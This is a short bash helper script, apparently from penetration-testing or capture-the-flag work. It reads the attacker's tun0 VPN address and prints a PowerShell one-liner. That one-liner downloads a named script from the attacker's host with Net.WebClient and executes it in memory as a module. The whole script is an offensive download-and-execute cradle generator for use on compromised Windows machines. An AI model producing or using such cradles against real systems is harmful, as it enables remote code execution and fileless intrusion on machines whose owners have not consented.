#!/bin/bash

if [ "$#" -lt 1 ]; then
    printf '%s <downloadmodule>' "$0" 1>&2
    exit 1
fi

ip="$(ip a s tun0 | grep -oP '(\d{1,3}\.){3}\d{1,3}')"
printf 'New-Module -Name '"'"'%s'"'"' -ScriptBlock ([Scriptblock]::Create((New-Object Net.WebClient).DownloadString('"'"'http://%s/%s'"'"')))' "$1" "$ip" "$1"